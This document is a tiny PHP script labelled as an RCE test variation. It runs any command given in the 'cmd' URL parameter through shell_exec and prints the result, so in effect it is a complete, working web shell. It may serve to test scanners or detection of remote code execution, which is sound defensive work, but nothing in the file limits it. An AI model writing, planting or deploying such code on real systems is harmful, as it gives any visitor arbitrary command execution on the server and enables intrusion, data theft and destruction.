<?php
// RCE test variation #487
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>